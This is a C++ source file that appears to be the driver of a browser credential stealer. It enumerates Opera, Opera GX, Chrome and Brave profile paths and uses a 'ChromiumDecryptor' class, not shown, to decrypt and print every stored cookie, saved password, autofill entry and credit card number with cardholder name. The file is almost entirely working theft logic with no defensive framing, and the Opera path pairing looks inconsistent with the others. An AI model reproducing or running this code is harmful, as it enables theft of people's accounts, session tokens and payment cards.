#include "src/Decrypt.h"
#include <iostream>
std::unordered_map<std::string, std::string> BrowserPath;
void printData(ChromiumDecryptor* target)
{
	if (target && target->InitSuccess)
	{
		for (auto x : target->getCookie())
		{
			printf("Url %s Name %s Value %s\n", x.URL.c_str(), x.Name.c_str(), x.Value.c_str());
		}
		for (auto x : target->getPassword())
		{
			printf("Url %s Username %s Password %s\n", x.URL.c_str(), x.Username.c_str(), x.Password.c_str());
		}
		for (auto x : target->getAutoFill())
		{
			printf("Name %s Value %s\n", x.Name.c_str(), x.Value.c_str());
		}
		for (auto x : target->getCreditCard())
		{
			printf("Number : %s Year %i Month %i Name %s\n", x.CardNumber.c_str(), x.Year, x.Month, x.NameOnCard.c_str());
		}
	}
}
void appendBrowser(const std::string& BrowserName)
{
	const std::string defaultUserDataPath = BrowserName + "\\User Data\\Default";
	const std::string localStatePath = BrowserName + "\\User Data\\Local State";
	if (BrowserName.find("Opera Software") != std::string::npos) {
		BrowserPath.insert({ BrowserName, BrowserName + "\\Local State" });
	}
	else {
		BrowserPath.insert({ localStatePath, defaultUserDataPath });
	}
}
int main()
{
	appendBrowser("Opera Software\\Opera Stable");
	appendBrowser("Opera Software\\Opera GX Stable");
	appendBrowser("Google\\Chrome");
	appendBrowser("BraveSoftware\\Brave-Browser");
	//.....
	for (const auto& x : BrowserPath) {
		ChromiumDecryptor* Decrypter = new ChromiumDecryptor(x.first.c_str(), x.second.c_str());
		Decrypter->init();
		printData(Decrypter);
		delete Decrypter;
	}
	
	system("pause");
}